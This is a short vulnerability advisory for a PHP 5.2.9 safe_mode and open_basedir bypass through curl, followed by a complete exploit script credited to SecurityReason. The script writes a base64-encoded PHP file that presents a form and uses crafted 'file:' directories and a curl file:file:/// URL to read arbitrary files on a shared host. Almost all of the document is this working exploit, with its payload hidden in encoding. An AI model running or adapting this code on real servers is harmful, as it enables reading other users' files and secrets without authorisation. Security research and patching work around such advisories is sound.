source: http://www.securityfocus.com/bid/34475/info

PHP is prone to a 'safe_mode' and 'open_basedir' restriction-bypass vulnerability. Successful exploits could allow an attacker to access files in unauthorized locations.

This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code, with the 'safe_mode' and 'open_basedir' restrictions assumed to isolate the users from each other.

PHP 5.2.9 is vulnerable; other versions may also be affected. 

<?php
/* SecurityReason.com - Security Audit Stuff

PHP 5.2.9 curl safe_mode & open_basedir bypass
http://securityreason.com/achievement_securityalert/61

exploit from "SecurityReason - Security Audit" lab.
for legal use only

http://securityreason.com/achievement_exploitalert/11

author: Maksymilian Arciemowicz
cxib [a&t] securityreason [0.0] com

R.I.P. ladyBMS

*/

$freiheit=fopen('./cx529.php', 'w');

fwrite($freiheit, base64_decode("
PD9waHANCi8qDQpzYWZlX21vZGUgYW5kIG9wZW5fYmFzZWRpciBCeXBhc3MgUEhQIDUuMi45
DQpieSBNYWtzeW1pbGlhbiBBcmNpZW1vd2ljeiBodHRwOi8vc2VjdXJpdHlyZWFzb24uY29t
Lw0KY3hpYiBbIGEuVF0gc2VjdXJpdHlyZWFzb24gWyBkMHRdIGNvbQ0KDQpOT1RFOg0KaHR0
cDovL3NlY3VyaXR5cmVhc29uLmNvbS9hY2hpZXZlbWVudF9zZWN1cml0eWFsZXJ0LzYxDQoN
CkVYUExPSVQ6DQpodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tL2FjaGlldmVtZW50X2V4cGxv
aXRhbGVydC8xMA0KKi8NCg0KaWYoIWVtcHR5KCRfR0VUWydmaWxlJ10pKSAkZmlsZT0kX0dF
VFsnZmlsZSddOw0KZWxzZSBpZighZW1wdHkoJF9QT1NUWydmaWxlJ10pKSAkZmlsZT0kX1BP
U1RbJ2ZpbGUnXTsNCg0KZWNobyAnPFBSRT48UD5UaGlzIGlzIGV4cGxvaXQgZnJvbSA8YQ0K
aHJlZj0iaHR0cDovL3NlY3VyaXR5cmVhc29uLmNvbS8iIHRpdGxlPSJTZWN1cml0eUF1ZGl0
Ij5TZWN1cml0eSBBdWRpdCAtIFNlY3VyaXR5UmVhc29uPC9hPiBsYWJzLg0KQXV0aG9yIDog
TWFrc3ltaWxpYW4gQXJjaWVtb3dpY3oNCjxwPlNjcmlwdCBmb3IgbGVnYWwgdXNlIG9ubHku
DQo8cD5QSFAgNS4yLjkgc2FmZV9tb2RlICYgb3Blbl9iYXNlZGlyIGJ5cGFzcw0KPHA+TW9y
ZTogPGEgaHJlZj0iaHR0cDovL3NlY3VyaXR5cmVhc29uLmNvbS8iPlNlY3VyaXR5UmVhc29u
PC9hPg0KPHA+PGZvcm0gbmFtZT0iZm9ybSIgYWN0aW9uPSJodHRwOi8vJy4kX1NFUlZFUlsi
SFRUUF9IT1NUIl0uaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiU0NSSVBUX04NCkFNRSJd
KS4kX1NFUlZFUlsiUEhQX1NFTEYiXS4nIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlPSJ0
ZXh0IiBuYW1lPSJmaWxlIiBzaXplPSI1MCIgdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygk
ZmlsZSkuJyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iaGFyZHN0eWxleiIgdmFsdWU9
IlNob3ciPjwvZm9ybT4nOw0KDQoNCiRsZXZlbD0wOw0KDQppZighZmlsZV9leGlzdHMoImZp
bGU6IikpDQoJbWtkaXIoImZpbGU6Iik7DQpjaGRpcigiZmlsZToiKTsNCiRsZXZlbCsrOw0K
DQokaGFyZHN0eWxlID0gZXhwbG9kZSgiLyIsICRmaWxlKTsNCg0KZm9yKCRhPTA7JGE8Y291
bnQoJGhhcmRzdHlsZSk7JGErKyl7DQoJaWYoIWVtcHR5KCRoYXJkc3R5bGVbJGFdKSl7DQoJ
CWlmKCFmaWxlX2V4aXN0cygkaGFyZHN0eWxlWyRhXSkpIA0KCQkJbWtkaXIoJGhhcmRzdHls
ZVskYV0pOw0KCQljaGRpcigkaGFyZHN0eWxlWyRhXSk7DQoJCSRsZXZlbCsrOw0KCX0NCn0N
Cg0Kd2hpbGUoJGxldmVsLS0pIGNoZGlyKCIuLiIpOw0KDQokY2ggPSBjdXJsX2luaXQoKTsN
Cg0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImZpbGU6ZmlsZTovLy8iLiRmaWxl
KTsNCg0KZWNobyAnPEZPTlQgQ09MT1I9IlJFRCI+IDx0ZXh0YXJlYSByb3dzPSI0MCIgY29s
cz0iMTIwIj4nOw0KDQppZihGQUxTRT09Y3VybF9leGVjKCRjaCkpDQoJZGllKCc+U29ycnku
Li4gRmlsZSAnLmh0bWxzcGVjaWFsY2hhcnMoJGZpbGUpLicgZG9lc250IGV4aXN0cyBvciB5
b3UgZG9udCBoYXZlIHBlcm1pc3Npb25zLicpOw0KDQplY2hvICcgPC90ZXh0YXJlYT4gPC9G
T05UPic7DQoNCmN1cmxfY2xvc2UoJGNoKTsNCg0KPz4=
"));

fclose($freiheit);

echo "exploit has been generated . use cx529.php file";
?>
